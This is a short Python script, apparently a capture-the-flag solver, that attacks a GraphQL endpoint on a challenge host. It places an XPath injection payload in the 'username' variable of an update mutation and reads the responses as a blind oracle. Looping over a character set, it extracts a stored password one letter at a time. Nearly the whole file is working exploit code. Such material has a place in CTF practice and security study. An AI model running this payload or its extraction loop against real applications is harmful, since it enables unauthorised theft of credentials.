import requests, string

host = 'https://vibed-intranet-p1-efed9cbf1dd52b89.tjc.tf'

def doThing(word):
    data = {
        "query":"mutation updateStudentX($username: String!, $description: String!, $grade: Int!) { updateStudentX(username: $username, description: $description, grade: $grade) { ok } }",
        "variables": {
            "username": f"x'] | //password[starts-with(text(),\"{word}\")] | //meow[@attr='1","description":"adminDesc",
            "grade": 100
        }
    }
    r = requests.post(f'{host}/graphql', json=data)
    try:
        ok = r.json()['data']['updateStudentX']['ok']
    except:
        return { 'r': r, 'ok': True }
    return { 'r': r, 'ok': False }


letters = string.ascii_letters + string.digits + ' {}\'~`!@#$%^&*()=-+_;/.,?><'

word = "amkji2ho2h"

while True:
    for letter in letters:

        if len(word)==0 and letter in ['W']:
            continue

        print(f'[{word}] trying {letter}')
        r = doThing(word + letter)
        ok = r['ok']
        if ok:
            word += letter
            print(f'yup :) {word}')
            break

        if letter == letters[-1]:
            print(':( letters exhausted')
            exit()
